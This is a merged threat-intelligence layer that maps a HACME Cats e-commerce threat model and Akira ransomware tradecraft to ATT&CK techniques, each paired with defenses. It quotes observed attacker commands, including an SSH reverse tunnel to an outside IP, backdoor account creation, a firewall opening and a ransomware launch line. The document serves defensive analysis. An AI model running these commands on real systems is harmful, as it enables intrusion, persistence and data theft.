name: HACME Cats Threat Model + Akira Ransomware CTI — Merged Layer
description: Aggregated ATT&CK Navigator layer merging two sources: (1) HACME Cats e-commerce platform threat model (attack tree analysis, 5 branches) shown in BLUE, and (2) Akira ransomware campaign CTI extracted from Arctic Wolf Labs 'Smash and Grab' blog (Sep 2025, targeting SonicWall SSL VPNs via CVE-2024-40766) shown in ORANGE. Techniques appearing in BOTH sources are shown in PURPLE, indicating validated overlap between theoretical threat modeling and observed real-world TTPs.

metadata.value: HACME Cats — Organic Cat Food E-Commerce Threat Model (Attack Tree, 5 Branches)

metadata.name: source_2
metadata.value: Arctic Wolf Labs — Smash and Grab: Akira Campaign Targeting SonicWall VPNs (Sep 2025)

techniques.comment:
[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Threat actors targeted VM storage and DC filesystems for domain credentials. Veeam credential extraction included DPAPI secret decryption. AD data exfiltrated via wbadmin.exe in related intrusions.

[HACME Cats Threat Model]
[HIGH] Branch 2.3: Magecart-style skimmer captures PAN, CVV, and billing address in real time from E1 (customer browser context) before Stripe tokenization. Branch 5.3: Data scraped from product catalog (D2) and customer reviews containing PII after rate-limit bypass. | Defense: D3-CSPP — Subresource Integrity (SRI) on all third-party scripts + strict CSP.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] AD computer enumeration: 'Get-ADComputer -Filter * -Property *' selecting Name, DNSHostName, IPv4Address, OperatingSystem, servicePrincipalName. Network scanners for host discovery.

[HACME Cats Threat Model]
[MEDIUM] Branch 4.3: Lateral movement from VPN-connected position to database tier — enumerate and access D1, D2, D3 from internal network. Flat internal network post-VPN provides direct path to data stores. | Defense: D3-MFA + D3-NI — Micro-segmentation between application and database tiers at TB3 + network monitoring for anomalous internal connections.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] RDP was primary lateral movement tool. Event ID 4624 (logon type 10) observed. Used after initial discovery phase to move between servers in compromised environments.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] SMBv2 session setup requests with Impacket signature. Hostnames: kali, WIN, DESKTOP-HPLM2TD, WINUTIL, etc. Failed (4625) and successful (4624) SMB logon type 3 events.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] SSH reverse tunnels: 'ssh -R 5555 root@170.130.165[.]42'. OpenSSH on 0.0.0.0. Cloudflared under C:\ProgramData\ssh for SSH access via Cloudflare Tunnel from domain controllers.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] quser command via WMIExec to identify logged-in users: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOM 2>&1'. Six-character randomized output filename is WMIExec signature.

[HACME Cats Threat Model]
[LOW] Branch 2.1: Network sniffing on payment tokenization requests between P6 → E2 if TLS is misconfigured or downgraded. Requires privileged network position or compromised infrastructure. | Defense: D3-CH — Enforce TLS 1.2+ on all Stripe API connections + certificate pinning + Stripe restricted API keys with IP allowlisting.

[HACME Cats Threat Model]
[MEDIUM] Branch 4.3: Exfiltrate D1 (Customer Database) via encrypted tunnel back through the VPN connection. Data blends with legitimate VPN traffic, making detection difficult without DLP inspection. | Defense: D3-NTF — DLP on VPN egress + anomalous data volume alerting + micro-segmentation limiting lateral access.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Internal scanning < 5 min after VPN login. Ports: 135 (RPC), 137 (NetBIOS), 445 (SMB), 1433 (SQL). Tools: SoftPerfect Network Scanner, Advanced IP Scanner deployed to %Temp%, Downloads, Desktop.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Impacket WMIExec usage — quser commands redirected to six-character randomized filenames: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOMIZED 2>&1'. Signature consistent with WMIExec.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[LOW] Branch 4.1: Insider exfiltrates data over alternative protocol — personal email, USB, or cloud storage upload from internal network. Bypasses application-layer logging in D5 (ELK Stack) since exfiltration occurs outside monitored application flows. | Defense: D3-DQSA — Database Activity Monitoring + DLP controls on endpoints + USB device restrictions + cloud upload monitoring.

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] Data exfiltrated via FileZilla SFTP, rclone, and SSH to VPS endpoints. Multiple exfiltration methods observed across different Akira affiliates.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1056.004 for Magecart-style credential API hooking in Branch 2.3.

[HACME Cats Threat Model]
[MEDIUM] Branch 2.3: Magecart-style attack — injected JavaScript skimmer hooks into payment form DOM events, capturing keystrokes on checkout pages BEFORE Stripe client-side tokenization. Skimmed PAN, CVV, and billing data exfiltrated to attacker-controlled endpoint in real time. PCI tokenization architecture bypassed at browser layer. | Defense: D3-CSPP — Subresource Integrity (SRI) on all third-party scripts + strict CSP with no unsafe-inline.

[HACME Cats Threat Model]
[HIGH] Parent technique — see T1059.004 (Unix Shell) and T1059.007 (JavaScript) for specific sub-technique usage.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] PowerShell used extensively: Get-ADUser/Get-ADComputer for AD enumeration, Invoke-WebRequest/WebClient for tool downloads (AnyDesk, cloudflared), custom scripts for Veeam credential extraction (MSSQL + PostgreSQL), New-NetFirewallRule for firewall modification.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] cmd.exe used for: net user/net localgroup (account creation), quser (WMIExec-style session discovery with randomized output filenames), sc create (service installation), SSH tunnel initiation.

[HACME Cats Threat Model]
[HIGH] Branch 1.1: SQL injection escalation via PostgreSQL stacked queries or COPY TO command for arbitrary file read on AWS RDS host. Chained after initial SQLi (T1190) to escalate from data extraction to OS-level access. | Defense: D3-SQLAI — Parameterized query enforcement + WAF SQL signature inspection at TB1 + RDS IAM authentication.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.4: Node.js prototype pollution via crafted JSON payload with __proto__ targeting deep-merge utilities in P2 (API Gateway) request pipeline. Branch 2.2: Malicious npm dependency executes JavaScript to exfiltrate environment variables (DB creds, API keys) via DNS/HTTPS callback. Branch 2.3: Compromised Google Analytics tag or marketing script injects Magecart-style skimmer on checkout pages. | Defense: D3-PSA (RASP), D3-SBV (SBOM verification), D3-CSPP (SRI + strict CSP).

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] BloodHound for AD relationship/permission group enumeration. MemberOf attribute collected in Get-ADUser. ESX Admins group targeted for privilege escalation. NetExec also used.

[HACME Cats Threat Model]
[LOW] Parent technique — see T1070.001 for insider log tampering in Branch 4.4.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[LOW] Branch 4.4: Insider log tampering — IT admin accesses ELK Stack (D5) with elevated privileges and deletes or modifies access logs, query logs, and authentication events to cover exfiltration activity. Anti-forensics technique to eliminate evidence trail. | Defense: D3-FAPA — Immutable log forwarding to separate SIEM + WORM (Write-Once-Read-Many) log archival + separation of duties for log admin role.

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] Windows Event Logs cleared as part of defense evasion phase before ransomware deployment.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Data staged via WinRAR with consistent CLI syntax across multiple compromised hosts. Only source/target drive letters varied. Archives prepared in staging directories before transfer.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[HIGH] Appears across multiple branches as the culmination of credential theft or session hijacking. Branch 1.2: Hijacked admin session used to access D1 via P1 admin functions. Branch 2.2: npm supply chain exfiltrates DB creds, attacker connects to D1/D3. Branch 3.1: Credential stuffing yields valid customer accounts at scale. Branch 3.2: Forged admin JWT used to bulk export D1. Branch 4.2: Social engineering yields customer account access. Branch 5.2: Mass assignment escalates to admin role. | Defense: D3-MFA, D3-AZETL, D3-DNSAL across all instances.

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] Credentials harvested via CVE-2024-40766 used to authenticate against patched devices. Repeated malicious SSL VPN logins observed on OTP MFA-enabled accounts. Evidence points to valid credentials rather than OTP config modification.

[HACME Cats Threat Model]
[HIGH] Branch 3.1: Credential stuffing at scale — compromised customer accounts used to exfiltrate PII, order history, saved payment methods. Stuffed credentials sourced from darknet breach corpuses. | Defense: D3-AZETL — Rate limiting + CAPTCHA on login + breached password detection via HaveIBeenPwned API.

[HACME Cats Threat Model]
[LOW] Branch 4.1: Privileged IT admin with legitimate AWS RDS/cloud access misuses authorized credentials to directly query D1 (Customer Database) for bulk PII export. No exploitation required — this is an insider abuse of valid cloud account permissions. | Defense: D3-DQSA — Database Activity Monitoring (DAM) + just-in-time access provisioning + query anomaly alerting for bulk SELECT on PII tables.

[HACME Cats Threat Model]
[HIGH] Branch 3.3: Enumerate customer accounts via authenticated API calls after OAuth flow abuse. Branch 5.1: Enumerate sequential or predictable user/order IDs on P2 REST API endpoints — no object-level authorization check beyond valid session token. Access other customers' order details (D3) and profile data (D1). | Defense: D3-ACL — Object-level authorization + UUID-based resource identifiers.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] AD user enumeration: 'Get-ADUser -Filter * -Properties *' selecting Enabled, Name, SamAccountName, MemberOf, PasswordLastSet, LastLogonDate, etc. Output to C:\ProgramData\AdUsers.txt. Also: nltest, dsquery, BloodHound, ldapdomaindump.

[HACME Cats Threat Model]
[HIGH] Branch 5.3: Rate-limiting bypass via residential proxy IP rotation, multiple accounts, or X-Forwarded-For header spoofing. WAF at TB1 trusts proxy headers if misconfigured, enabling mass data scraping at scale. | Defense: D3-AZETL — Multi-layered rate limiting (API gateway + WAF + application) + device fingerprinting + bot management.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[MEDIUM] Branch 2.1: Compromised Stripe API keys used for account manipulation (refunds to attacker accounts). Branch 5.2: Mass assignment — inject additional fields ({"role":"admin"} or {"price":"0.01"}) in PUT/POST requests to P2. Server-side model binding without property allowlist enables privilege escalation. | Defense: D3-CH (credential hardening for Stripe), D3-ABAC (explicit DTO allowlisting per endpoint).

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] Newly created accounts elevated to local Administrators group and domain ESX Admins group. Used for lateral movement, exfiltration, and RMM tool installation.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Ingress tool transfer: AnyDesk via WebClient.DownloadFile, cloudflared via Invoke-WebRequest, SoftPerfect/Advanced IP Scanner to %Temp%, RustDesk via batch script. Also Start-BitsTransfer as fallback.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[HIGH] Parent technique — see T1110.004 (Credential Stuffing) for primary attack path in Branch 3.1.

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] SonicWall confirmed SonicOS < 7.3 susceptible to brute force against MFA. Evenly spaced periodic logins across multiple accounts suggest automated authentication scripting.

[HACME Cats Threat Model]
[HIGH] Branch 3.1: Credential stuffing/password spraying against customer accounts on P3 (Auth Service) via P2 (API Gateway). Attacker uses breached credential corpus from darknet, automates login attempts with residential proxy IP rotation to evade WAF rate limiting at TB1. Crosses TB1 boundary. | Defense: D3-AZETL — Rate limiting + CAPTCHA + breached password detection via HaveIBeenPwned API integration.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] MFA bypass — threat actors authenticated against OTP MFA-enabled accounts. SonicWall confirmed OTP seeds could be used to generate valid tokens. Google TIG uncovered related OTP seed theft on SonicWall SMA.

[HACME Cats Threat Model]
[HIGH] Branch 5.1: Automated scraping of all customer profiles and order histories at scale via BOLA/IDOR on P2 API. Branch 5.3: Mass data scraping after rate-limit bypass — product catalog (D2), customer reviews with PII leakage. Branch 5.5: GraphQL query batching to bypass per-request rate limits, enumerating user data in single HTTP requests. | Defense: D3-ACL (object-level authz), D3-AZETL (multi-layer rate limiting), D3-ANAA (per-operation rate limiting).

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[MEDIUM] Branch 4.3: After obtaining employee VPN credentials via spearphishing, attacker authenticates to VPN and accesses internal portal (E5 → P1). Crosses TB4 trust boundary with legitimate credentials. Internal network often flat post-VPN, enabling lateral movement to database tier. | Defense: D3-MFA — VPN MFA + Zero Trust device posture checks + micro-segmentation between app and DB tiers at TB3.

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] Initial access via SonicWall SSL VPN logins from VPS hosting providers. Both local firewall accounts and LDAP-synchronized AD accounts targeted, including LDAP sync service accounts not intended for VPN access.

[HACME Cats Threat Model]
[MEDIUM] Branch 3.2: Forge admin-level JWT with elevated claims (role: admin) after exploiting weak signing configuration. Bypasses authorization checks on P1 admin endpoints. See T1134.001 for sub-technique detail. | Defense: D3-DNSAL — RS256/ES256 asymmetric signing + short-lived tokens (15 min TTL) + token binding to client fingerprint.

[HACME Cats Threat Model]
[MEDIUM] Branch 3.2: JWT token forgery exploiting weak signing (alg:none vulnerability, symmetric HMAC with leaked/guessable secret). Attacker crafts admin-level JWT with elevated role claims to bypass P3 authorization, then uses forged token to access P1 admin functions and bulk export D1 (Customer Database). | Defense: D3-DNSAL — RS256/ES256 asymmetric signing + short-lived tokens + token binding to client fingerprint.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] SharpShares for share enumeration: 'SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$ /threads:1000 /outfile:C:\programdata\tb.txt'. Output reviewed in Notepad.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Local admin accounts created on Veeam backup servers and VM admin servers. Account names blend in: 'sqlbackup', 'veean'. Commands: 'net user sqlbackup REDACTED /add' + 'net localgroup administrators sqlbackup /add'.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Domain accounts created and elevated to 'ESX Admins' group. Used for data exfiltration and RMM tool installation. Command: 'net group "ESX Admins" REDACTED /domain /add'.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.2: Stored XSS for session hijacking — persistent malicious script injected via product review, account profile, or support ticket field. Unsanitized UGC renders in admin portal (E5) or customer-facing pages, enabling drive-by compromise of admin sessions. | Defense: D3-CSPP — Strict Content Security Policy headers + HttpOnly/Secure flags on JWT cookies.

[OVERLAP — HACME Cats Threat Model + Akira CTI]

--- HACME CATS (Threat Model) ---
[HIGH] Branch 1.1: SQL Injection — Fuzz injectable parameters in product search, login, order-history endpoints (E1→P2→D1/D2). Branch 1.3: SSRF — Abuse image-upload/webhook callback to reach AWS metadata (169.254.169.254). Branch 3.4: Direct Redis attack via misconfigured instance (no AUTH, port 6379 exposed at TB3). Branch 5.1: BOLA/IDOR — Enumerate sequential resource IDs on P2 API endpoints (GET /api/v1/orders/{id}, /users/{id}/profile). | Defense: D3-SQLAI (parameterized queries + WAF), D3-NTF (IMDSv2 + egress filtering), D3-ACL (object-level authz + UUIDs).

--- AKIRA CTI (Arctic Wolf Labs, Sep 2025) ---
[AKIRA CTI] CVE-2024-40766 (improper access control) in SonicOS 5/6/7. Exploitation enabled abuse of admin functions such as configuration backup, creating credential theft opportunities. NSa and TZ series devices affected.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1195.002 for npm supply chain poisoning path in Branch 2.2.

[HACME Cats Threat Model]
[MEDIUM] Branch 2.2: npm dependency poisoning targeting P1/P2 Node.js supply chain. Attacker publishes typosquatted or compromised npm package with malicious postinstall scripts or runtime hooks. Exfiltrates environment variables (DB credentials, API keys) on build or first execution. | Defense: D3-SBV — Lock files enforced, npm audit in CI/CD pipeline, Snyk/Socket.dev continuous dependency monitoring.

[HACME Cats Threat Model]
[LOW] Branch 2.4: Abuse trusted relationship with shipping provider (E3 — FedEx/UPS). Extract shipping API credentials from P4 configuration or verbose logs in D5 (ELK Stack), then use credentials to query all tracking data and exfiltrate customer names and physical addresses via shipping manifests. | Defense: D3-AL — API credential scoping to minimum permissions + log redaction for sensitive fields in D5.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.4: After achieving RCE via prototype pollution/insecure deserialization on P1 (EC2 instance), attacker pivots to internal network exploiting remote services. Crosses TB2 (DMZ → Application Tier) boundary. | Defense: D3-PSA — Runtime Application Self-Protection (RASP) + input schema validation + network micro-segmentation.

[HACME Cats Threat Model]
[HIGH] Branch 1.1: Extract customer PII from D1 (Customer Database) via UNION-based or blind SQL injection — direct path to credentials, PII, order history. Branch 2.4: Query shipping tracking data to exfiltrate customer names and physical addresses via shipping manifests. Branch 4.1: IT admin with RDS access directly queries D1 for PII export — authorized access misused. | Defense: D3-SQLAI (parameterized queries), D3-AL (log field redaction), D3-DQSA (Database Activity Monitoring).

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Multiple RMM tools for persistent remote access: AnyDesk downloaded via PowerShell to C:\ProgramData\AnyDesk.exe, TeamViewer installed, RustDesk installed via batch script and registered as Windows service with auto-start.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] ldapdomaindump for LDAP enumeration and domain trust discovery. nltest for domain controller enumeration and trust relationships.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Akira ransomware deployed: 'akira.exe -n=1 -p=D:\' and share lists '-s=share.txt'. Both Akira and Akira_v2 (Megazord/Rust-based) encryptors observed. Full kill chain in under 4 hours (fastest: 55 min).

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Volume Shadow Copies deleted via vssadmin.exe before ransomware deployment. Standard Akira pre-encryption recovery inhibition.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1499.003 for GraphQL denial of service in Branch 5.5.

[HACME Cats Threat Model]
[MEDIUM] Branch 5.5: GraphQL depth/batch attack — send deeply nested or batched queries to P2 for resource exhaustion. Denial of service used as cover for concurrent data exfiltration on a separate session. Also exploits query batching to bypass per-request rate limits, enumerating user data in single HTTP requests. | Defense: D3-ANAA — Query depth limiting + query cost analysis + per-operation rate limiting (not just per-HTTP-request).

[HACME Cats Threat Model]
[MEDIUM] Branch 3.3: OAuth 2.0 authorization flow abuse — exploit open redirect in OAuth callback URL to leak authorization codes from P3 (Authentication Service). Stolen codes exchanged for access + refresh tokens enabling persistent account access. | Defense: D3-ORA — Strict redirect URI allowlisting + PKCE enforcement + authorization code single-use with short TTL.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.3: Exfiltrate customer PII directly from D1 via database connection using stolen IAM credentials from SSRF attack. Branch 4.2: Attacker accesses victim's account after social engineering support agent — views order history, saved addresses, partial payment data. Branch 5.4: API responses return excessive data (hashed passwords, internal IDs) beyond what frontend consumes. | Defense: D3-NTF, D3-UBA, D3-OAM respectively.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.2: Steal admin JWT from D4 (Redis Session Store) via document.cookie exfiltration or fetch() request to attacker C2 server. Chained after stored XSS injection (T1189). Stolen admin session enables access to D1 customer data via P1 admin functions. | Defense: D3-CSPP — HttpOnly/Secure cookie flags + strict CSP preventing inline script execution.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] RustDesk registered as persistent service: 'sc create RustDesk binpath=... start= auto'. Cloudflared installed as service: 'cloudflared.exe service install TOKEN'. Both configured for persistence across reboots.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1550.001 for OAuth token abuse in Branch 3.3.

[HACME Cats Threat Model]
[MEDIUM] Branch 3.3: Exchange stolen OAuth authorization code for access + refresh tokens. Refresh token provides persistent access to customer accounts, enabling ongoing PII exfiltration through authenticated API calls to P2. | Defense: D3-ORA — PKCE enforcement + authorization code single-use + refresh token rotation + short TTL.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see sub-techniques T1552.001, T1552.004, T1552.005 for specific credential exposure paths.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.4: Database connection strings found in environment variables or config files on compromised EC2 instance after prototype pollution RCE. Branch 2.1: Stripe API keys exposed in .env files, git history, CI/CD artifacts, or error pages. Branch 2.4: Shipping API credentials extracted from P4 configuration or verbose logs in D5 (ELK Stack). | Defense: D3-CH (credential hardening) + AWS Secrets Manager + log field redaction.

[HACME Cats Threat Model]
[LOW] Branch 3.4: Dump all active session tokens (including admin sessions) from misconfigured Redis instance (D4). Requires direct access to Redis port 6379 due to security group misconfiguration at TB3 boundary. | Defense: D3-NI — Redis AUTH + TLS in transit + VPC security group restricting D4 access to application-tier IPs only.

[HACME Cats Threat Model]
[MEDIUM] Branch 1.3: SSRF exploitation to reach AWS EC2 metadata endpoint (169.254.169.254) and exfiltrate IAM role temporary credentials from P1 instance. Stolen IAM creds used to pivot to AWS RDS (D1/D2/D3) across TB3 boundary. | Defense: D3-NTF — IMDSv2 enforcement (requiring session tokens) + egress filtering blocking RFC1918/link-local ranges from application-tier requests.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Custom PowerShell script extracted encrypted creds from Veeam Backup & Replication (v11/v12), supporting MSSQL and PostgreSQL. Decrypted DPAPI secrets and Base64-encoded formats. Also: sqlcmd used to query VeeamBackup.dbo.Credentials directly.

[HACME Cats Threat Model]
[LOW] Branch 2.1: Adversary-in-the-middle on payment data flow between P6 (Payment Module) and E2 (Stripe). Requires compromised Stripe API keys + TLS misconfiguration to intercept/replay tokenization requests. Branch 3.4: MitM positioning to intercept Redis (D4) session traffic if unencrypted. | Defense: D3-CH (Stripe restricted keys + IP allowlisting), D3-NI (Redis TLS + VPC security group lockdown).

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] WinRAR with -v3g (3GB split archives). Files filtered by recency and business relevance: general folders = 6 months, HR/AP folders = up to 30 months of data exfiltrated.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] EDR tools and Microsoft Defender disabled prior to ransomware deployment. Systematic defense impairment as pre-encryption preparation.

[Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] Host firewall modified: 'New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22'. OpenSSH configured on 0.0.0.0.

[HACME Cats Threat Model]
[LOW] Branch 3.4: Remote service session hijacking — replay stolen admin session tokens dumped from compromised Redis instance (D4) to access P1 admin functions and exfiltrate D1 (Customer Database). Requires prior exploitation of misconfigured Redis (no AUTH, exposed port). | Defense: D3-NI — Redis AUTH + TLS in transit + VPC security group restricting D4 to application-tier only at TB3.

[HACME Cats Threat Model]

[MEDIUM] Branch 4.3: Spearphish employee for VPN credentials targeting ~50 employee pool (warehouse, customer support, marketing, IT). [MEDIUM] Branch 4.2: Attacker contacts customer support posing as a legitimate customer, requests account details or password reset. [Akira CTI — Arctic Wolf Labs, Sep 2025]
[AKIRA CTI] SSH reverse tunnels and Cloudflare Tunnels to bypass NAT for C2. Cloudflared ran from AD DCs, installed as persistent service. Automated PowerShell installation scripts with fallback download URLs.

[HACME Cats Threat Model]
[HIGH] Parent technique — see T1589.001 for primary reconnaissance path in Branch 3.1.

[HIGH] Branch 3.1: Attacker obtains breached credential corpus (username/password pairs) from darknet markets as precursor to credential stuffing campaign against P3 (Auth Service). [HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1592.004 for API schema reconnaissance in Branch 5.4.

[HACME Cats Threat Model]
[MEDIUM] Branch 5.4: Discover undocumented API endpoints or enabled Swagger/OpenAPI specification on P2 (API Gateway). Exposed /api/docs, /swagger.json, or /api-docs endpoints reveal full API schema including internal field names and data models. Reconnaissance enables chained attacks with BOLA (5.1). | Defense: D3-OAM — Disable schema/documentation endpoints in production + API response schema validation middleware.

[HACME Cats Threat Model]
[MEDIUM] Parent technique — see T1595.003 for API endpoint wordlist scanning in Branch 5.4.

[HACME Cats Threat Model]
[MEDIUM] Branch 5.4: Active scanning with wordlists to discover undocumented or debug API endpoints on P2 — /api/docs, /swagger.json, /api-docs, /graphql, /debug, /internal. Exposed schema reveals attack surface for chaining with BOLA/IDOR (5.1) and excessive data exposure. | Defense: D3-OAM — Disable all non-essential endpoints in production + API inventory management.
